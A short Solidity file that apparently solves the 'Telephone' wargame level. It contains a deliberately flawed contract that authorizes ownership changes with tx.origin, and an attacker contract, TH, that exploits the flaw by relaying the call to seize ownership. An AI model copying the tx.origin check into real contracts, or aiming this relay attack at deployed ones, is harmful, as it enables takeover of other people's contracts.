// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}


contract TH {
  Telephone th;

  constructor(address telephone) public {
      th = Telephone(telephone);
  }

  function callChangeOwner() public {
    th.changeOwner(msg.sender);
  }
}